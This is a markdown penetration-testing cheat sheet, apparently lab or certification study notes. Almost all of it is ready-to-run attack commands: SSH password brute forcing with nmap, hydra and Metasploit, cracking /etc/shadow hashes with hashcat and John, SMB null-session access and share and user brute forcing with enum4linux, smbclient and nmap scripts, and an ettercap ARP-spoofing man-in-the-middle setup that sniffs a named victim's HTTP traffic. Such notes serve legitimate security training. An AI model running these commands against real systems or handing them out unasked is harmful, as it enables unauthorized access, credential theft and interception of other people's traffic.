#### Authentication Cracking
|Types|Bruteforce Attack | Dictionary Attack |
|---|---|---|

> Factors Affecting Online Password Cracking: Latency, Delay, Processing time,etc....

#### SSH Bruteforce With Nmap

```
nmap 192.168.143.67 -p 22 --script ssh-brute --script-args userdb=username.txt,passdb=password.txt

```

#### SSH Bruteforce With Hydra
```
hydra -l student -P /usr/share/wordlists/rockyou.txt ssh://192.194.185.3 -f

```

#### SSH Bruteforce With Metasploit
```
scanner/ssh/ssh_login module
```

#### Crack /etc/hashes With hahcat and John
```
/etc/login.defs >> Check Hashing Algorithm

hashcat -m 1800 admin.hash /root/Desktop/wordlists/1000000-password-seclists.txt --force

john /etc/shadow --wordlist=/root/Desktop/wordlists/1000000-password-seclists.txt

```

#### nULl Session Attack

> Allows user to connect to network without valid password in windows server.

```
smbclient //10.10.10.10/C$ -N

enum4linux -U 192.168.23.1 >> Enumerate Users

enum4linux -n 192.168.23.1 >> NBT stat

enum4linux -P 192.168.23.1 >> GIVES PASSWORD POLICY ON REMOTE MACHINE

enum4linux -S 192.168.23.1 >> LIST SHARES

enum4linux -s /usr/share/enum4linux/share-list.txt 192.168.23.1  >> Bruteforce Shares

enum4linux -A 192.168.23.1 >> FULL ENUM

sambrdump.py 192.168.23.1 

nmap -script=smb-enum-shares,smb-enum-users,smb-brute 192.168.23.1


```

> Note: Sometime we maynot see shares using enum4linux we can bruteforce the  users and try connecting to respective shares using -N flag.
#### Accessing Public Shares with smbclient

```
smbclient //192.123.28.3/demo
```

#### Check perm across Shares

```
smbmap -H host
```

#### Mitm Attack Using Ettercap
* Enumerate live hosts using nmap.

```
nmap -sn 192.168.3.0/24
```

#### Enable IP Forwarding in Linux

```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

```
sudo ettercap -T -S -i eth0 -M arp:remote /10.0.0.1// /10.0.0.129//

-T  - text only
-S  - No ssl
-M  - Method
10.10.0.1  - Router
10.0.0.129 - Victim
```
* Start Wireshark with root perm
```
ip.addr == 10.0.0.129 && http

```

